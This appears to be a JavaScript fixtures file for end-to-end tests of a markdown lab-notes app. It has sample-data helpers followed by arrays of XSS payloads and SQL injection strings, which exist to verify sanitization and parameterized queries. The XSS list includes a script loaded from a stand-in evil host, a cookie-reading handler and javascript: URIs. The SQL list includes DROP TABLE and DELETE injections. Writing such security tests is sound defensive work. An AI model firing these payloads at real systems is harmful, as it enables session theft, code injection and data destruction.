// e2e_tests/helpers/fixtures.js
import { randomUUID } from 'node:crypto';

/**
 * Generate a collision-resistant unique name for test isolation.
 * @param {string} [prefix='test']
 * @returns {string}
 */
export function uniqueName(prefix = 'test') {
  return `${prefix}_${Date.now()}_${randomUUID().slice(0, 8)}`;
}

/**
 * Generate a sample subject payload.
 * @param {object} [override]
 * @returns {{name: string, position: number}}
 */
export function sampleSubject(override = {}) {
  return {
    name: uniqueName('subj'),
    position: 0,
    ...override,
  };
}

/**
 * Generate a sample page draft payload.
 * @param {string} subjectId
 * @param {object} [override]
 * @returns {{draft_title: string, draft_subject_id: string, draft_markdown: string}}
 */
export function samplePageDraft(subjectId, override = {}) {
  const title = override.title || override.draft_title || uniqueName('Lab_Work');
  const subjId = override.subject_id || override.draft_subject_id || subjectId;
  const markdown = override.markdown || override.draft_markdown || '# Introduction\n\n```bash\necho "Hello LabNotes"\n```\n';

  return {
    subject_id: subjId,
    title,
    markdown,
    // Backwards-compatible aliases for legacy callers and sanity tests:
    draft_subject_id: subjId,
    draft_title: title,
    draft_markdown: markdown,
    ...override,
  };
}

/**
 * Generate a rich, valid Markdown document testing all supported syntax elements:
 * H1, H2, H3, paragraphs, lists, checklists, blockquotes, code blocks, tables, images, links.
 * @param {string} [title='Sample Practical Lab']
 * @returns {string}
 */
export function sampleMarkdown(title = 'Sample Practical Lab') {
  return `# ${title}

## Overview
This document contains the complete laboratory practical instructions and tasks.

## Getting Started
Follow these sequential steps to configure the laboratory environment:

1. Clone the project repository:
\`\`\`bash
git clone https://example.com/lab-repo.git
cd lab-repo
\`\`\`

2. Verify local prerequisites:
- [x] Node.js 18+ installed
- [x] Rust stable toolchain available
- [ ] Network firewall configured for port 8080

> **Important Note:**
> All laboratory outputs must be documented before proceeding to the next step.

## Performance Metrics Table

| Metric | Target | Acceptable Threshold |
| :--- | :--- | :--- |
| Startup Latency | < 50ms | < 200ms |
| Idle Memory RSS | < 100MB | < 150MB |
| Throughput | > 1000 req/s | > 500 req/s |

## Visual Architecture
![System Architecture Diagram](/media/00000000-0000-0000-0000-000000000001)

## Supplementary Files
Download the reference binary attachment: [Starter Kit](/media/00000000-0000-0000-0000-000000000002)
`;
}

/**
 * Comprehensive collection of adversarial XSS injection payloads
 * used to verify that markdown-it (html: false) and DOMPurify sanitize all attack vectors.
 */
export const xssMarkdownPayloads = [
  '<script>alert("xss_direct_script")</script>',
  '<script src="https://evil.example.com/malicious.js"></script>',
  '<img src="nonexistent.png" onerror="alert(\'xss_img_onerror\')">',
  '<img src=x onerror=alert(document.cookie)>',
  '<a href="javascript:alert(\'xss_link_proto\')">Click to win</a>',
  '<a href="JAVASCRIPT:alert(1)">Click to win upper</a>',
  '<a href="   javascript:alert(1)">Click with whitespace</a>',
  '<svg onload="alert(\'xss_svg_onload\')"><rect width="10" height="10"/></svg>',
  '<body onload="alert(\'xss_body_onload\')">',
  '<iframe src="javascript:alert(\'xss_iframe\')"></iframe>',
  '<object data="javascript:alert(\'xss_object\')"></object>',
  '<embed src="javascript:alert(\'xss_embed\')">',
  '[Markdown Link Exploitation](javascript:alert("xss_md_link"))',
  '![Markdown Image Exploitation](javascript:alert("xss_md_img"))',
  '[Data Protocol Exploitation](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
];

/**
 * Collection of SQL injection vectors used to verify parameterized query security.
 */
export const sqlInjectionPayloads = [
  "' OR '1'='1",
  "'; DROP TABLE pages; --",
  "\" OR \"\"=\"",
  "' UNION SELECT 1, 'admin', 'hash', datetime('now'), datetime('now') --",
  "1; DELETE FROM subjects;",
];
